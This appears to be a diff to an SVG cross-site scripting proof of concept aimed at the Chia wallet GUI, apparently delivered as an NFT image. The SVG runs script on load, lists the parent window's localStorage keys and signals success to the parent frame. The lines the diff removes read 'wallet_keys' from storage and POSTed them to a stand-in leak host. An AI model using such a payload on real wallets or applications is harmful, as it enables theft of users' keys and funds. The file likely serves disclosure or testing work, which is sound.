@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!-- XSS PoC SVG for Chia GUI -->
+<!-- XSS PoC SVG for Chia GUI: well-formed, no unescaped < or > in attributes -->
 <svg xmlns="http://www.w3.org/2000/svg"
      width="100" height="100"
      onload="alert('Chia GUI XSS PoC – SVG loaded');">
@@ -11,23 +11,16 @@
   <!-- Inline payload -->
   <script type="application/ecmascript"><![CDATA[
     alert('Chia GUI XSS PoC – inline script running');
-    console.log('localStorage keys →', Object.keys(window.top.localStorage || {}));
 
-    /* Try to exfiltrate first 100 bytes of wallet keys (if present) */
+    /* Enumerate localStorage keys from parent (if same-origin) */
     try {
-      const keys = window.top.localStorage.getItem('wallet_keys');
-      if (keys) {
-        fetch('https://example.com/leak', {
-          method: 'POST',
-          mode: 'no-cors',
-          body: keys.slice(0, 100)
-        });
-      }
+      console.log('window.top.localStorage keys →',
+                  Object.keys(window.top.localStorage || {}));
     } catch (e) {
-      console.log('localStorage access blocked:', e);
+      console.log('Cannot read window.top.localStorage:', e);
     }
 
-    /* Signal success */
+    /* Signal success to parent frame */
     window.top.postMessage(
       { source: 'chia_nft_svg', type: 'xss_confirmed' },
       '*'
